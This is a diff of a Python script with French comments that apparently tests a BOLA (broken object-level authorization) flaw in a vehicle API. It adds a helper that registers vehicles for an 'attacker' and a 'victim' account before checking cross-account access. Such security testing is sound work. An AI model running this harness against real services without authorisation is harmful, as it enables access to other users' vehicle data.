@@ -163,11 +163,21 @@ def main():
 
     atk, vic = tokens  # atk = foulen, vic = foulana
 
-    # 2. Ressources
-    st, res = http("GET", f"{base}/identity/api/v2/vehicle/vehicles", token=atk)
-    atk_vehicles = find_ids(res, "vehicle_id") or find_ids(res, "vehicleId")
-    st2, res2 = http("GET", f"{base}/identity/api/v2/vehicle/vehicles", token=vic)
-    vic_vehicles = find_ids(res2, "vehicle_id") or find_ids(res2, "vehicleId")
+    def ensure_vehicles(token, vin, pin="789456"):
+        """Ajoute un vehicule si le compte nen a pas (BOLA necessite 2 vehicules)."""
+        st, res = http("GET", f"{base}/identity/api/v2/vehicle/vehicles", token=token)
+        ids = find_ids(res, "vehicle_id") or find_ids(res, "vehicleId")
+        if not ids:
+            st, res = http("POST", f"{base}/identity/api/v2/vehicle/add_vehicle",
+                           {"vin": vin, "pincode": pin}, token=token)
+            print(f"    add_vehicle {vin} -> HTTP {st}: {str(res)[:100]}")
+            st, res = http("GET", f"{base}/identity/api/v2/vehicle/vehicles", token=token)
+            ids = find_ids(res, "vehicle_id") or find_ids(res, "vehicleId")
+        return ids, res
+
+    # 2. Ressources (avec creation si besoin)
+    atk_vehicles, res = ensure_vehicles(atk, "1HGCM82633A004352")
+    vic_vehicles, res2 = ensure_vehicles(vic, "2HGGCM82633A004353")
     print(f"  * Vehicules: attaquant={atk_vehicles} victime={vic_vehicles}")
 
     findings = []
